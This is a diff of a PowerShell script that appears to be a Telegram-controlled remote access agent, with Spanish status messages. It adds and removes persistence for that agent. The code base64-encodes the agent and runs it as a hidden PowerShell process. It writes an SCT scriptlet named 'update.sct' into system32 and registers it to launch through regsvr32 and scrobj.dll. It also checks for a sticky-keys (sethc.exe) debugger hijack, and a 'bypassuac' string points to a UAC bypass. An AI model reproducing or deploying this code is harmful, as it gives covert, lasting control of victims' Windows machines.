@@ -203,7 +203,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
 $plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\update.sct" 
-Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" 
+Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" | out-null
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
@@ -211,8 +211,6 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$comando = (Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"})
-
 $key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
 $key2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe";$check2 = Get-ItemProperty $key2 -name Debugger | Select-String "regsvr32.exe"
 if ($check.count -eq 0 -and $check2.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
